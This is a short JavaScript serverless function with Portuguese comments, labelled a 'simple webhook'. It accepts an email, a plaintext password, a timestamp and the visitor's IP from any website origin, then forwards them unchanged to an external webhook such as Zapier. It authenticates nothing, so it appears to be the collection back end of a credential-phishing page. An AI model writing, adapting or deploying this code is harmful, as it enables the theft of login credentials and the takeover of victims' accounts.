// Webhook simples - você pode conectar isso a qualquer serviço
// Ex: Zapier, Make.com, Google Apps Script, etc.

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { email, password, timestamp, ip } = req.body;

        if (!email || !password) {
            return res.status(400).json({ error: 'Email e senha são obrigatórios' });
        }

        // Aqui você pode fazer o que quiser com os dados
        // Ex: enviar para outro serviço, webhook externo, etc.
        
        const webhookUrl = process.env.WEBHOOK_URL;
        
        if (webhookUrl) {
            // Enviar para webhook externo (Zapier, Make.com, etc)
            try {
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email,
                        password,
                        timestamp,
                        ip
                    })
                });
            } catch (error) {
                console.error('Erro ao enviar webhook:', error);
            }
        }

        res.json({ 
            success: true,
            message: 'Dados recebidos'
        });

    } catch (error) {
        console.error('Erro no webhook:', error);
        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
};
